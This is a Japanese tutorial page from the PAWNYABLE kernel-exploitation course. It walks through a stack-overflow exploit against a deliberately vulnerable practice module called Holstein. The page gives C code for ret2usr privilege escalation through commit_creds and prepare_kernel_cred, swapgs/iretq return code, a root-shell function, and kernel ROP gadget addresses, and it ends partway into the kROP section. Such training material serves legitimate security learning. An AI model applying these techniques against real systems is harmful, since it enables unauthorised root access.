@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+
+
+
+
+
+<title>Holstein v1: Stack Overflowの悪用 | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline-flex;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+            
+                Holstein v1: Stack Overflowの悪用
+            
+            
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="welcome-to-holstein.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="heap_overflow.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>前節ではHolsteinモジュールにStack Overflowを見つけ、脆弱性を利用してRIPを取れることを確認しました。この節ではこれをLPEに繋げる方法と、さまざまなセキュリティ機構を回避する方法を学びます。</p>
+<div class="column" title="目次">
+<!-- toc -->
+<ul>
+<li><a href="#%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC%E3%81%AE%E6%96%B9%E6%B3%95">権限昇格の方法</a>
+<ul>
+<li><a href="#prepare_kernel_cred%E3%81%A8commit_creds">prepare_kernel_credとcommit_creds</a></li>
+<li><a href="#swapgs-%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E7%A9%BA%E9%96%93%E3%81%B8%E3%81%AE%E5%BE%A9%E5%B8%B0">swapgs: ユーザー空間への復帰</a></li>
+</ul>
+</li>
+<li><a href="#ret2user-ret2usr">ret2user (ret2usr)</a></li>
+<li><a href="#krop">kROP</a></li>
+<li><a href="#kpti%E3%81%AE%E6%89%B1%E3%81%84">KPTIの扱い</a></li>
+<li><a href="#kaslr%E3%81%AE%E5%9B%9E%E9%81%BF">KASLRの回避</a>
+<ul>
+<li><a href="#kaslr%E3%81%AE%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AD%E3%83%94%E3%83%BC">KASLRのエントロピー</a></li>
+<li><a href="#%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%83%AA%E3%83%BC%E3%82%AF">アドレスリーク</a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+<br>
+</div>
+<h2><span id="権限昇格の方法">権限昇格の方法</span></h2>
+<p>権限昇格の方法にはいろいろありますが、最も基本的な手法は<code>commit_creds</code>を使う方法です。これは、カーネルがroot権限のプロセスを作る時に実行する処理と同じことを実行する方法で、非常に自然な考え方です。<br>
+root権限を取った後にもう1つ重要なのが、ユーザー空間に戻ることです。今カーネルモジュールをexploitしているのでコンテキストはカーネルですが、最終的にはユーザー空間に戻ってroot権限のシェルを取る必要があるので、クラッシュせずにユーザー空間に戻る必要があります。<br>
+まずはこれらの理論的部分について説明します。</p>
+<h3><span id="prepare_kernel_credとcommit_creds">prepare_kernel_credとcommit_creds</span></h3>
+<p>すべてのプロセスには権限が割り当てられます。これは<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/include/linux/cred.h#L110"><strong>cred構造体</strong></a>と呼ばれる構造体でヒープ上で管理されています。各プロセス（タスク）は<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/include/linux/sched.h#L661"><strong>task_struct構造体</strong></a>という構造体で管理され、その中にcred構造体へのポインタがあります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>cred構造体はプロセスが生成されるタイミングなどで作られるのですが、それを担う関数として<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L719"><strong><code>prepare_kernel_cred</code></strong></a>というKernel Exploitで非常に重要な関数があります。この関数を少しだけ読んでみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 引数としてtask_struct構造体へのポインタを取る */</span></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一引数にNULLを与えて<code>prepare_kernel_cred</code>を呼んだ時の挙動を追います。まず以下のコードでcred構造体が新たに確保されます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br></pre></td></tr></table></figure>
+<p>そして第一引数<code>daemon</code>がNULLのとき、次のコードで<code>init_cred</code>と呼ばれるcred構造体のデータが引き継がれます。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure>
+<p>その後<code>old</code>の正当性を検証し、<code>old</code>から<code>new</code>に適当にメンバを引き継いでいきます。</p>
+<p><code>prepare_kernel_cred(NULL)</code>により、<code>init_cred</code>を使ったcred構造体が生成されます。では<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L41"><code>init_cred</code>の定義</a>も見てみましょう。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">	.usage			= ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	.subscribers		= ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">	.magic			= CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	.uid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.gid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.suid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.sgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.euid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.egid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.fsuid			= GLOBAL_ROOT_UID,</span><br><span class="line">	.fsgid			= GLOBAL_ROOT_GID,</span><br><span class="line">	.securebits		= SECUREBITS_DEFAULT,</span><br><span class="line">	.cap_inheritable	= CAP_EMPTY_SET,</span><br><span class="line">	.cap_permitted		= CAP_FULL_SET,</span><br><span class="line">	.cap_effective		= CAP_FULL_SET,</span><br><span class="line">	.cap_bset		= CAP_FULL_SET,</span><br><span class="line">	.user			= INIT_USER,</span><br><span class="line">	.user_ns		= &amp;init_user_ns,</span><br><span class="line">	.group_info		= &amp;init_groups,</span><br><span class="line">	.ucounts		= &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>コードを見れば分かるように、<code>init_cred</code>はまさにroot権限のcred構造体になります。</p>
+<p>これでroot権限のcred構造体が作れそうです。次にこの権限を現在のプロセスに設定してやる必要があります。その役割を果たすのが<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L449"><code>commit_creds</code>関数</a>になります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br></pre></td></tr></table></figure>
+<p>したがって、</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br></pre></td></tr></table></figure>
+<p>を呼び出すのがKernel Exploitで権限昇格するための1つの手法となります。</p>
+<h3><span id="swapgs-ユーザー空間への復帰">swapgs: ユーザー空間への復帰</span></h3>
+<p><code>prepare_kernel_cred</code>と<code>commit_creds</code>でめでたくroot権限が取れたのですが、それで終わりではありません。<br>
+ROP chainが終わった後、何事もなかったかのようにユーザー空間に復帰してシェルを取る必要があります。せっかくroot権限を取ってもクラッシュしたり、プロセスが終了したりしては意味がありません。</p>
+<p>ROPというのは本来保存されていたスタックフレームを破壊してchainを書き込むので、元に戻るというのは直感的には非常に困難です。しかし、Kernel Exploitではあくまで脆弱性を発火させるプログラム（プロセス）は我々が作るので、ROP終了後にRSPをユーザー空間に戻し、RIPをシェルを取る関数に設定してやればユーザー空間に戻れます。<br>
+そもそもユーザー空間からカーネル空間に移動する方法ですが、これはCPUの命令が特権モードを切り替えることで実現されます。ユーザー空間からカーネル空間に行く方法は通常システムコール<code>syscall</code>と割り込み<code>int</code>だけです。そして、カーネル空間からユーザー空間に戻るためには通常<code>sysretq</code>, <code>iretq</code>という命令が使われます。<code>sysretq</code>より<code>iretq</code>の方が単純ですので、Kernel Exploitでは普通<code>iretq</code>を使います。また、カーネルからユーザー空間に戻る際、カーネルモードのGSセグメントからユーザーモードのGSセグメントに切り替える必要があります。このためにIntelでは<code>swapgs</code>命令が用意されています。<br>
+流れとしては<code>swapgs</code>と<code>iretq</code>を順番に呼び出せば良いです。<code>iretq</code>を呼び出すとき、スタックには戻り先のユーザー空間の情報を次のように積んでおく必要があります。</p>
+<center>
+  <img src="img/iretq.png" alt="iretq呼び出し時のスタック" style="width:340px;">
+</center>
+<p>ユーザー空間のRSP, RIPに加え、CS,SS,RFLAGSもユーザー空間のものに戻す必要があります。RSPはどこでも良いですし、RIPはシェルを起動する関数にでも設定しておけば良いです。残りのレジスタはもともとユーザー空間にいたときの値を使えば良いので、次のようにレジスタの値を保存する補助関数を用意しておきましょう。（RSPも保存しておきました。）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">asm</span>(</span><br><span class="line">      <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">      <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">      <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">      : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line">      :</span><br><span class="line">      : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ユーザー空間にいる間にこれを呼んでおき、<code>iretq</code>を呼ぶタイミングでこの値を使えるようにしておけば良いです。</p>
+<h2><span id="ret2user-ret2usr">ret2user (ret2usr)</span></h2>
+<p>ここまで説明してきた理論を使って、いよいよ権限昇格を実践してみます。</p>
+<p>まずは最も基礎的な手法であるret2userについて説明します。今回SMEPが無効なので、ユーザー空間のメモリに置いてあるコードをカーネル空間から実行できます。つまり、ここまで説明した<code>prepare_kernel_cred</code>, <code>commit_creds</code>, <code>swapgs</code>, <code>iretq</code>の流れをそのままC言語で書いておけばOKです。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">win</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">char</span> *envp[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] win!&quot;</span>);</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">restore_state</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;swapgs ;&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="string">&quot;movq %0, 0x20(%%rsp)\t\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="string">&quot;movq %1, 0x18(%%rsp)\t\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="string">&quot;movq %2, 0x10(%%rsp)\t\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="string">&quot;movq %3, 0x08(%%rsp)\t\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="string">&quot;movq %4, 0x00(%%rsp)\t\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="string">&quot;iretq&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">               :</span></span></span><br><span class="line"><span class="params"><span class="function">               : <span class="string">&quot;r&quot;</span>(user_ss),</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="string">&quot;r&quot;</span>(user_rsp),</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="string">&quot;r&quot;</span>(user_rflags),</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="string">&quot;r&quot;</span>(user_cs), <span class="string">&quot;r&quot;</span>(win))</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">escalate_privilege</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = (<span class="keyword">void</span>*)(prepare_kernel_cred);</span><br><span class="line">  <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = (<span class="keyword">void</span>*)(commit_creds);</span><br><span class="line">  (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">  restore_state();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>これらの処理は簡単なKernel Exploitでは頻出なので、各自自分に合ったコードでテンプレートとして持っておきましょう。<code>main</code>関数の先頭にでも<code>save_state</code>を呼ぶ処理を追加しておきましょう。</p>
+<p><code>escalate_privilege</code>関数内で<code>prepare_kernel_cred</code>と<code>commit_creds</code>という関数ポインタが必要になりますが、今回KASLRが無効なのでこの値は固定のはずです。実際にこれらの関数のアドレスを取得し、コード中に書いておきましょう。</p>
+<center>
+  <img src="img/check_kallsyms.png" alt="/proc/kallsymsからアドレスを取得" style="width:380px;">
+</center>
+<p>さて、あとは脆弱性を使って<code>escalate_privilege</code>関数を呼べば終わりです。適当に<code>escalate_privilege</code>のポインタを大量に書き込んでも良いですが、後々ROPをすることになるので、リターンアドレスの正確なオフセットを把握しておきましょう。<br>
+オフセットはカーネルモジュールをIDAなどで読んで計算しても良いですが、せっかくなのでgdbを使って脆弱性が発火する部分を確認しましょう。</p>
+<p><code>module_write</code>中で<code>_copy_from_user</code>を呼んでいる箇所をIDAなどで見ると、アドレスは0x190です。<code>/proc/modules</code>から得たベースアドレスと足してブレークポイントを付けた状態でwriteを呼んでみます。<br>
+書き込み先のRDIから0x400先は次のようになっています。</p>
+<center>
+  <img src="img/gdb_debug_copy.png" alt="_copy_from_userでの書き込み先" style="width:580px;">
+</center>
+<p>さらにretまで進めると、</p>
+<center>
+  <img src="img/gdb_debug_ret.png" alt="module_write終了時の様子" style="width:580px;">
+</center>
+<p>となっており、RSPは0xffffc90000413eb0を指しています。</p>
+<center>
+  <img src="img/gdb_debug_ret_regs.png" alt="module_write終了時のレジスタの様子" style="width:480px;">
+</center>
+<p>したがって、0x408バイトだけゴミデータを入れた後からRIPを制御できそうです。<br>
+ということで、次のようにexploitを変更してみました。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x410</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x410</span>);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x408</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;escalate_privilege;</span><br><span class="line">write(fd, buf, <span class="number">0x410</span>);</span><br></pre></td></tr></table></figure>
+<p>最終的なexploitは<a href="exploit/ret2usr.c">ここ</a>に置いておきます。</p>
+<p><code>module_write</code>のret命令で止めてみると、<code>escalate_privilege</code>に到達していることが分かります。</p>
+<center>
+  <img src="img/gdb_escalate_privilege.png" alt="RIP制御でescalate_privilegeを呼び出し" style="width:520px;">
+</center>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="オオカミくん"></div>
+  <p class="says">
+    nextiコマンドを実行しても次の命令で止まらないことがあるよ。<br>
+    そういうときはstepiを試してみるか、少し先にブレークポイントを貼ると良いかも？
+  </p>
+</div>
+<p>正しくexploitが書けていれば<code>prepare_kernel_cred</code>と<code>commit_creds</code>を通過します。<code>restore_state</code>の中もステップインで見てみましょう。<code>iretq</code>を呼ぶ際のスタックは次のようになります。</p>
+<center>
+  <img src="img/gdb_rsp_before_iretq.png" alt="iretq直前のスタックの様子" style="width:580px;">
+</center>
+<p>stepiで<code>win</code>関数に飛んでいれば成功です。</p>
+<center>
+  <img src="img/ret2usr_win.png" alt="win関数の呼び出し成功" style="width:320px;">
+</center>
+<p>今はもともとroot権限なので成功したか分かりませんが、とりあえずユーザー空間に戻れています。<br>
+では変更した設定(S99pawnyable)を元に戻し、一般ユーザーからexploitを実行してみましょう。</p>
+<center>
+  <img src="img/ret2usr_lpe.png" alt="ret2usrによるLPEの様子" style="width:400px;">
+</center>
+<p>権限昇格に成功しました！<br>
+初めて知る知識が多くて少し難しかったかもしれませんが、これからさらにヒープや競合などの脆弱性を扱っていくうちに、どんな脆弱性でもほとんどやることは同じなので、実は結構簡単だと気付くことになります。お楽しみに！</p>
+<h2><span id="krop">kROP</span></h2>
+<p>次にSMEPを有効化してみましょう。qemu起動時のcpu引数に<code>smep</code>を付けてみましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
+<p>この状態で先程のret2userのexploitを動かしてみましょう。</p>
+<center>
+  <img src="img/smep_crash.png" alt="SMEPを付けるとクラッシュする" style="width:640px;">
+</center>
+<p>クラッシュしてしまいました😢<br>
+「unable to execute userspace code (SMEP?)」となっており、SMEPによりユーザー空間のコードが実行できなくなっていることが分かります。</p>
+<p>これはユーザー空間におけるNX(DEP)に非常に似ています。ユーザー空間のデータを読み書きはできますが、実行はできなくなりました。したがって、NXを回避するのと同様に、SMEPはROPにより回避可能です。カーネル空間でのROPをkROPと呼ぶことが多いです。</p>
+<p>Kernel Exploitに挑戦している皆さんならret2userでやった処理をROPにするのも簡単だと思います。実際ROP chainを書くにあたり特に注意する点はありませんが、ROP gadgetを探す部分までは一緒にやっていきましょう。<br>
+まずLinuxカーネルのROP gadgetを探すには、bzImageからvmlinuxというカーネルのコアになるELFを取り出す必要があります。これには公式で<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>というシェルスクリプトが提供されているので利用しましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
+<p>あとはお好みのツールを使ってROP gadgetを探します。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ropr vmlinux --noisy --nosys --nojop -R &#x27;^pop rdi.+ret;&#x27;</span><br><span class="line">...</span><br><span class="line">0xffffffff8127bbdc: pop rdi; ret;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>出力されるアドレスは絶対アドレスになっています。この値はKASLRを無効にした際のベースアドレス（0xffffffff81000000）に相対アドレスを足したものなので、例えば上の例だと0x27bbdcが相対アドレスになります。今回はKASLRが無効なので出力されたアドレスをそのまま使えますが、KASLRが有効な場合は相対アドレスを使うように注意しましょう。<br>
+Linuxカーネルはlibcなどよりも膨大な量のコードなので、基本的に任意の操作ができるほどのROP gadgetがあります。今回は以下のgadgetを使いましたが、デバッグの練習も兼ねて自分の好きなROP chainを組んでみてください。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff8127bbdc: pop rdi; ret;</span><br><span class="line">0xffffffff81c9480d: pop rcx; ret;</span><br><span class="line">0xffffffff8160c96b: mov rdi, rax; rep movsq [rdi], [rsi]; ret;</span><br><span class="line">0xffffffff8160bf7e: swapgs; ret;</span><br></pre></td></tr></table></figure>
+<p>最後に<code>iretq</code>が必要ですが、これは通常のツールでは探してくれないのでobjdumpなどで探しましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -S -M intel vmlinux | grep iretq</span><br><span class="line">ffffffff810202af:       48 cf                   iretq</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="オオカミくん"></div>
+  <p class="says">
+    ROP gadgetを探すためのツールのほとんどはカーネルのような膨大な量のバイナリに対して十分にテストされていないよ。<br>
+    対応していない命令をスキップしていたり、命令のprefixを省略したりと、間違った出力が多いから気を付けようね。<br>
+    それから、gadgetがカーネル空間で実際に実行可能領域に含まれるかを正しく判別できないツールがほとんどだから、アドレスが大きいgadget (例:0xffffffff81cXXXYYY) には特に注意が必要だよ。
+  </p>
+</div>
+<p>ROP chainの書き方は自由ですが、筆者は次のように書いています。gadgetを途中で追加したり削除したりしてもオフセットの値を変更しなくて良いため、おすすめです。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *chain = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x408</span>];</span><br><span class="line">*chain++ = rop_pop_rdi;</span><br><span class="line">*chain++ = <span class="number">0</span>;</span><br><span class="line">*chain++ = prepare_kernel_cred;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
